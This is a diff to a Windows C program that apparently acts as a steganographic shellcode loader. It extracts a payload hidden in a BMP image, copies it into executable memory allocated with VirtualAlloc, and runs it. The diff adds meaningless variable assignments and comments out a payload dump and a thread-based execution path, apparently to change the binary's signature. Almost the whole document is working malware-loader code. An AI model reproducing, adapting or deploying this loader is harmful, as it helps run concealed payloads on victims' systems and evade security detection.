@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <windows.h>
 
+
 #include "src/utils.h"
 #include "src/structs.h"
 #include "src/steg.h"
@@ -13,6 +14,7 @@ int main(int argc, char *argv[]) {
     bitmap_header head;
     dib_header dbhead;
     FILE *bitmap_file;
+    int vs = 2;
     int e = 0;
 
     char *bitmap_fname = "out.bmp";
@@ -31,6 +33,8 @@ int main(int argc, char *argv[]) {
           printf("Error: Could not open %s.\n", bitmap_fname);
           return 0;
      }
+    
+    vs+=(6*9);
 
      fread(&head,    sizeof(bitmap_header), 1, bitmap_file);
      fread(&dbhead,  sizeof(dib_header), 1, bitmap_file);
@@ -45,7 +49,7 @@ int main(int argc, char *argv[]) {
      uint8_t *data = (uint8_t *)malloc(size);
      fread(data,  size, 1, bitmap_file);
      fclose(bitmap_file);
-
+    vs = size - 6;
     if (test_for_saved(data, size, 1) == 1) {
         /*
             This function will return the shellcode to "volume",
@@ -54,17 +58,25 @@ int main(int argc, char *argv[]) {
         uint8_t *volume = read_from_byte_array(data, size);
         uint32_t volume_size = get_hidden_data_size(data, size);
         printf("%db: ",volume_size);
-        for (int i = 0; i<volume_size; i++) {
+        /*for (int i = 0; i<volume_size; i++) {
             printf("%x", volume[i]);
-        }
+        }*/
         printf("\n");
 
         if (e != 0) {
             void *exec = VirtualAlloc(0, volume_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+            /*int x = 1;
+            HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)exec,&x, 0,NULL);
+            HANDLE Thread_Handles[1];
+            Thread_Handles[0] = hThread;
+            WaitForMultipleObjects( 1, Thread_Handles, TRUE, INFINITE);
+            CloseHandle(hThread);*/
+
 	        memcpy(exec, volume, volume_size-1);
 	        ((void(*)())exec)();
         }
-
+        vs = volume_size + 5;
         free(volume);
         return 0;
     }
